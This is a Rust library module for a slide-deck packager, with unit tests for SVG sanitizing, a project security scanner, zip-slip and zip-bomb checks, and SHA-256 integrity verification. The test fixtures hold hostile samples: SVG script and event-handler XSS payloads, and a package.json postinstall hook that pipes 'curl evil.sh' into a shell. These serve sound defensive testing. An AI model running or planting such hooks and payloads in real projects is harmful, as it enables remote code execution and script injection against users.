pub mod archive;
pub mod optimizer;
pub mod reader;
pub mod security;

pub use archive::{build_deck, compute_sha256_hex, generate_integrity_manifest};
pub use optimizer::{collect_and_optimize_directory, convert_raster_to_webp};
pub use reader::{mime_type_for_path, FoilArchiveReader};
pub use security::{
    run_bun_install_safe, sanitize_svg, scan_project_security, validate_archive_entry_path,
    PackagerError, SecurityViolation, ALLOWED_EXTENSIONS,
};

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;

pub const MAX_ARCHIVE_FILES: usize = 1_000;
pub const MAX_ARCHIVE_TOTAL_BYTES: u64 = 250 * 1024 * 1024;
pub const PRODUCTION_CSP: &str = "default-src 'self' foil: blob: data:; script-src 'self' foil: blob: 'unsafe-inline'; style-src 'self' foil: blob: 'unsafe-inline'; img-src 'self' foil: blob: data:; font-src 'self' foil: blob: data:; media-src 'self' foil: blob: data:; connect-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'";

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct IntegrityManifest {
    pub algorithm: String,
    pub files: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BuildReport {
    pub raw_size_bytes: u64,
    pub optimized_size_bytes: u64,
    pub archive_size_bytes: u64,
    pub converted_images: usize,
    pub verified_hashes: usize,
    pub output_path: PathBuf,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BuildTarget {
    FoilArchive,
    StaticWeb,
}

#[cfg(test)]
mod tests {
    use super::*;
    use image::{ImageBuffer, Rgba};
    use std::io::{Cursor, Write};
    use tempfile::tempdir;
    use zip::write::SimpleFileOptions;
    use zip::{CompressionMethod, ZipWriter};

    #[test]
    fn test_svg_sanitizer_removes_scripts_foreign_objects_and_event_handlers() {
        let malicious_svg = r#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)" onclick='steal()'><script>evil()</script><foreignObject><div>bad</div></foreignObject><a href="javascript:evil()"><rect width="100" height="100"/></a></svg>"#;
        let sanitized = sanitize_svg(malicious_svg);
        assert!(!sanitized.contains("<script"));
        assert!(!sanitized.contains("evil()"));
        assert!(!sanitized.contains("foreignObject"));
        assert!(!sanitized.contains("onload"));
        assert!(!sanitized.contains("onclick"));
        assert!(!sanitized.contains("javascript:"));
        assert!(sanitized.contains("<rect width=\"100\" height=\"100\"/>"));
    }

    #[test]
    fn test_static_security_scanner_blocks_lifecycle_scripts_and_forbidden_code() {
        let dir = tempdir().expect("tempdir");
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"bad-deck","scripts":{"postinstall":"curl evil.sh | sh"}}"#,
        )
        .expect("write package.json");
        std::fs::create_dir_all(dir.path().join("src")).expect("mkdir src");
        std::fs::write(
            dir.path().join("src/slide.js"),
            "export default { onEnter() { eval('alert(1)'); } };",
        )
        .expect("write slide.js");

        let err = scan_project_security(dir.path()).expect_err("should fail security scan");
        match err {
            PackagerError::SecurityViolations(violations) => {
                assert!(violations.iter().any(|v| v.rule == "forbidden_lifecycle_script"));
                assert!(violations.iter().any(|v| v.rule == "forbidden_eval"));
            }
            other => panic!("unexpected error: {other:?}"),
        }
    }

    #[test]
    fn test_archive_reader_blocks_zip_slip_and_disallowed_extensions() {
        let mut cursor = Cursor::new(Vec::new());
        {
            let mut zip = ZipWriter::new(&mut cursor);
            let opts = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
            zip.start_file("../evil.html", opts).expect("start_file");
            zip.write_all(b"<html></html>").expect("write");
            zip.finish().expect("finish");
        }
        let zip_bytes = cursor.into_inner();
        let res = FoilArchiveReader::from_bytes(&zip_bytes);
        assert!(matches!(res, Err(PackagerError::InvalidArchivePath(_))));

        let mut cursor_ext = Cursor::new(Vec::new());
        {
            let mut zip = ZipWriter::new(&mut cursor_ext);
            let opts = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
            zip.start_file("payload.exe", opts).expect("start_file");
            zip.write_all(b"MZ").expect("write");
            zip.finish().expect("finish");
        }
        let res_ext = FoilArchiveReader::from_bytes(&cursor_ext.into_inner());
        assert!(matches!(res_ext, Err(PackagerError::DisallowedExtension(_))));
    }

    #[test]
    fn test_archive_reader_blocks_zip_bomb_limits() {
        let mut cursor = Cursor::new(Vec::new());
        {
            let mut zip = ZipWriter::new(&mut cursor);
            let opts = SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
            zip.start_file("index.html", opts).expect("start_file");
            let payload = vec![b'A'; 2048];
            zip.write_all(&payload).expect("write");
            zip.finish().expect("finish");
        }
        let zip_bytes = cursor.into_inner();
        let res = FoilArchiveReader::from_bytes_with_limits(&zip_bytes, 10, 512);
        assert!(matches!(res, Err(PackagerError::ArchiveTooLarge(_, 512))));
    }

    #[test]
    fn test_build_deck_converts_images_to_webp_rewrites_refs_and_verifies_sha256() {
        let project_dir = tempdir().expect("tempdir");
        let dist_dir = project_dir.path().join("dist");
        std::fs::create_dir_all(dist_dir.join("assets")).expect("mkdir assets");

        let img: ImageBuffer<Rgba<u8>, Vec<u8>> =
            ImageBuffer::from_fn(2800, 1400, |x, y| Rgba([(x % 255) as u8, (y % 255) as u8, 128, 255]));
        let mut png_bytes = Vec::new();
        img.write_to(&mut Cursor::new(&mut png_bytes), image::ImageFormat::Png)
            .expect("encode png");
        std::fs::write(dist_dir.join("assets/hero.png"), &png_bytes).expect("write hero.png");

        std::fs::write(
            dist_dir.join("index.html"),
            r#"<!doctype html><html><body><img src="assets/hero.png"></body></html>"#,
        )
        .expect("write index.html");
        std::fs::write(
            project_dir.path().join("manifest.json"),
            r#"{"title":"Demo","aspectRatio":"16:9","width":1920,"height":1080,"theme":"default","slides":[]}"#,
        )
        .expect("write manifest.json");

        let output_foil = project_dir.path().join("deck.foil");
        let report =
            build_deck(project_dir.path(), &output_foil, BuildTarget::FoilArchive).expect("build_deck");

        assert_eq!(report.converted_images, 1);
        assert!(report.verified_hashes >= 3);

        let reader = FoilArchiveReader::from_path(&output_foil).expect("read valid foil archive");
        let (index_bytes, mime) = reader.get_asset("/").expect("index.html asset");
        assert_eq!(mime, "text/html; charset=utf-8");
        let index_str = String::from_utf8_lossy(index_bytes);
        assert!(index_str.contains("assets/hero.webp"));
        assert!(!index_str.contains("assets/hero.png"));

        let (webp_bytes, webp_mime) = reader
            .get_asset("assets/hero.webp")
            .expect("hero.webp asset");
        assert_eq!(webp_mime, "image/webp");
        let decoded = image::load_from_memory(webp_bytes).expect("decode webp");
        assert!(decoded.width() <= 2560);
    }

    #[test]
    fn test_tampered_archive_fails_sha256_integrity_verification() {
        let mut files = HashMap::new();
        files.insert("index.html".to_string(), b"<h1>Original</h1>".to_vec());
        let integrity = generate_integrity_manifest(&files);
        files.insert("index.html".to_string(), b"<h1>Tampered</h1>".to_vec());
        files.insert(
            "integrity.json".to_string(),
            serde_json::to_vec(&integrity).expect("serialize integrity"),
        );

        let dir = tempdir().expect("tempdir");
        let foil_path = dir.path().join("tampered.foil");
        archive::write_foil_zip_archive(&files, &foil_path).expect("write zip");

        let res = FoilArchiveReader::from_path(&foil_path);
        assert!(matches!(res, Err(PackagerError::IntegrityMismatch { .. })));
    }
}
